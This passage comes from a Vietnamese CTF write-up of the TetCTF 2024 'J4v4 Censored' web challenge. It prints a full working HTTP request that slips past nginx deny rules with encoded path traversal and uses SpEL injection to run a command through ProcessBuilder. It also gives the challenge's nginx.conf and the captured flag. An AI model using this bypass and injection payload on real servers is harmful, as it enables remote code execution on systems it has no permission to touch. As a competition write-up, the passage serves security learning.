<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>(<span style="color:#66d9ef">new</span> String(T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Character</span>).<span style="color:#a6e22e">toChars</span>(92))).<span style="color:#a6e22e">concat</span>(<span style="color:#66d9ef">new</span> String(T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Character</span>).<span style="color:#a6e22e">toChars</span>(65)))
</span></span></code></pre></div><p>Full payload:</p>
<pre tabindex="0"><code>GET /strategy;%2f%2e%2e%2f/validate-expression;%2f%2e%2e%2f/?condition=T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().setHeader(1,(T(java.util.Scanner).getConstructor(T(java.io.InputStream)).newInstance(new+ProcessBuilder(T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getRequest().getHeader(1)).start().getInputStream()).useDelimiter((new+String(T(java.lang.Character).toChars(92))).concat(new+String(T(java.lang.Character).toChars(65)))).next()))&amp;validation=a%3dtest HTTP/2
Host: java.tienbip.xyz
1: /readflag
</code></pre><p>Done ğŸ˜‡:
<img src="/images/2024/TetCTF-2024_J4v4-Censored/done.png" alt="done"></p>
<p><strong>flag</strong>:</p>
<pre tabindex="0"><code>TetCTF{ssrf`bYp4ss-sst!;W1th&lt;3. :)}
</code></pre><h2 id="end---ref">end - ref</h2>
<h3 id="nginxconf">nginx.conf</h3>
<p><strong>source Ä‘Æ°á»£c cung cáº¥p</strong>:
<a href="https://drive.google.com/file/d/1HZ268tSJK8FuSR-Y7c8XCuv5hOt7tF6R/view?usp=sharing">https://drive.google.com/file/d/1HZ268tSJK8FuSR-Y7c8XCuv5hOt7tF6R/view?usp=sharing</a></p>
<p><code>nginx.conf</code></p>
<pre tabindex="0"><code class="language-conf" data-lang="conf">server {
      listen 80;

      server_name    2024.tet.ctf;
      access_log /var/log/nginx/tetctf-access.log;
      error_log /var/log/nginx/tetctf-error.log;



      location / {
            proxy_set_header X-Forwarded-Host $host;
            proxy_set_header X-Forwarded-Server $host;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_pass http://nepxion-admin:1101;
      }

      location /v2/api-docs {
            if ($request_method = GET) {
                  rewrite /v2/api-docs /null break;
            }
            proxy_pass http://nepxion-admin:1101/v2/api-docs;
      }
      
      location ~ .*strategy.* {
            # prevent any cve for api endpoint :) 
            deny all;
      }


      location ~ .*validate-expression.* {
            # prevent any cve for api endpoint :) 
            deny all;
      }

      location ~ .*\/..\; {
            # it&#39;s bad for Tomcat :)
            deny all;
      }

      location ~ .*\/\; {
            # it&#39;s bad for Tomcat :)
            deny all;
      }

      location ~ .*\; {
            # it&#39;s bad for Tomcat :)
            deny all;
      }

}
</code></pre><ul>
<li>
<p>Check location regex block trÆ°á»›c prefix block:
<img src="/images/2024/TetCTF-2024_J4v4-Censored/nginx_process.png" alt="nginx_process"></p>
</li>
<li>
<p>proxy_pass original url thay vÃ¬ normalized url khi khÃ´ng specify uri <a href="https://serverfault.com/questions/459369/disabling-url-decoding-in-nginx-proxy">this</a>:
<img src="/images/2024/TetCTF-2024_J4v4-Censored/proxy_pass.png" alt="proxy_pass"></p>
</li>
</ul>
<h3 id="result-">result ğŸ˜ğŸ˜</h3>
<p><img src="/images/2024/TetCTF-2024_J4v4-Censored/result.png" alt="result"></p>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">Archives</a></li>
         
          <li><a href="/tags">Tags</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">preface</a></li>
    <li><a href="#exploring">exploring</a></li>
    <li><a href="#bypass-nginx">bypass nginx</a></li>
    <li><a href="#bypass-spel-injection-blacklist">bypass SpEL injection blacklist</a></li>
    <li><a href="#end---ref">end - ref</a>
      <ul>
        <li><a href="#nginxconf">nginx.conf</a></li>
        <li><a href="#result-">result ğŸ˜ğŸ˜</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&text=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&is_video=false&description=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&name=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule&description=preface%20Hi%21%20b%c3%a0i%20n%c3%a0y%20m%c3%acnh%20s%e1%ba%bd%20writeup%20l%e1%ba%a1i%20b%c3%a0i%20J4v4%20Censored%20trong%20gi%e1%ba%a3i%20TetCTF-2024%20m%c3%a0%20team%20m%c3%acnh%20%28KCSC%29%20%c4%91%c3%a3%20solve%20%c4%91%c6%b0%e1%bb%a3c.%20%c4%90%c3%a2y%20l%c3%a0%201%20b%c3%a0i%20java%20m%c3%acnh%20%c4%91%c3%a1nh%20gi%c3%a1%20kh%c3%b4ng%20qu%c3%a1%20kh%c3%b3%20nh%c6%b0ng%20l%e1%ba%a1i%20l%c3%a0%20half-black-box%20n%c3%aan%20ph%e1%ba%a3i%20%c4%91o%c3%a1n%2c%20fuzzing%20kh%c3%a1%20nhi%e1%bb%81u%20n%c3%aan%20khi%20l%c3%a0m%20m%c3%acnh%20kh%c3%a1%20n%e1%ba%a3n%20nh%c6%b0ng%20c%c5%a9ng%20nh%e1%bb%9d%20c%c3%b3%20teammates%20quy%e1%ba%bft%20t%c3%a2m%20t%c3%acm%20ra%20%c4%91%c6%b0%e1%bb%a3c%20unintended%20solution%20n%c3%aan%20may%20m%e1%ba%afn%20%28c%c5%a9ng%20ch%c3%adnh%20l%c3%a0%20team%20duy%20nh%e1%ba%a5t%29%20solved%20%c4%91%c6%b0%e1%bb%a3c." aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&t=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  devme4f blogs 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>




</html>
